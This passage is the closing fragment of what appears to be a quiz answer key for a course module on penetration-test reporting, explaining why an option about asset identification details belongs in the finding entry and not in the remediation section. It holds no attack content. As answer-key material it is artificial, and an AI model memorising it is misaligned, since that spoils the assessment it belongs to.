  * Why D is incorrect: Asset identification information (hostname, IP, OS version) is contextual metadata for the finding — it tells the client which system is affected. It belongs in the finding entry itself, not in a separate remediation recommendations section.

---

End of Module 16 Quiz
